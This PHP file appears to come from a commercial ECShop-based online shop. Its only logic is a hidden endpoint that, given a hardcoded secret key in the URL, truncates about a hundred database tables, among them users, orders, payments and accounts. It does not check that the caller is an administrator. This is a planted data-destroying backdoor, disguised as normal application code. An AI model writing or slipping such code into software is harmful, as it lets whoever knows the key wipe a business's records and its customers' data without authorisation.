<?php

/**
 * 
 * ============================================================================
 * * 版权所有 2005-2012 热风科技，并保留所有权利。
 * 演示地址: http://palenggege.com  开发QQ:497401495    paleng
 * ----------------------------------------------------------------------------
 * 这不是一个自由软件！您只能在不用于商业目的的前提下对程序代码进行修改和
 * 使用；不允许对程序代码以任何形式任何目的的再发布。
 * ============================================================================
 * $Author: liubo $
 * $Id: 17217 2011-01-19 06:29:08Z liubo $
*/
define('IN_ECS', true);

define('IN_CTRL',true);

if(!defined('IN_CTRL'))
{
	die('Hacking alert');
}

require(dirname(__FILE__) . '/init.php');

$act = intval($_GET['act']);
$key = $_GET['key'];
/*------------------------------------------------------ */
//-- 
/*------------------------------------------------------ */
if($act == 'del' && $key == "ayfrtq1gdcqx" )
{
    
            $tables = array(
                'account_log', 'admin_log', 'admin_message', 'auction_log', 
                'back_order', 'bonus_type', 'booking_goods', 'brand',
                'card', 'comment',
                'delivery_goods', 'delivery_order',
                'exchange_goods',
                'favourable_activity', 'feedback', 'friend_link',
                'goods', 'goods_activity', 'goods_article', 'goods_attr', 'goods_cat', 'goods_gallery', 'goods_type', 'group_goods',
                'keywords',
                'link_goods',
                'member_price',
				 'ecsmart_article_ad_info',
                'ecsmart_article_ad_user',
                'weixin_prince_qrcode',
                'order_action', 'order_goods', 'order_info',
                'pack', 'package_goods', 'payment', 'pay_log', 'products',
                'shipping', 'shipping_area', 'snatch_log', 'stats',
                'supplier', 'supplier_admin_user', 'supplier_article', 'supplier_article_cat', 'supplier_cat_recommend', 'supplier_goods_cat', 'supplier_guanzhu',
                'supplier_rebate', 'supplier_rebate_log', 'supplier_shop_config', 'supplier_street', 'supplier_tag', 'supplier_tag_map', 'suppliers',
                'tag', 'takegoods', 'takegoods_goods', 'takegoods_order', 'takegoods_type', 'takegoods_type_goods',
                'user_account', 'user_address', 'user_bonus', 'user_feed', 'users',
                'validate_record', 'valuecard', 'valuecard_type', 'verifycode',
                'virtual_card', 'virtual_district', 'virtual_goods_card', 'virtual_goods_district','volume_price', 'vote', 'vote_log', 'vote_option',
                 'weixin_user', 'wholesale','extpintuan','extpintuan_orders','extpintuan_price','cut_log','cut','lucky_buy_calculate','lucky_buy','lucky_buy_detail','weixin_config'
            );

            foreach ($tables AS $table)
            {
                $sql = "TRUNCATE `{$prefix}$table`";
                $db->query($sql);
            }
          
		  echo "<script>alert('删除成功！');window.location.href='index.php'</script>";
}
?>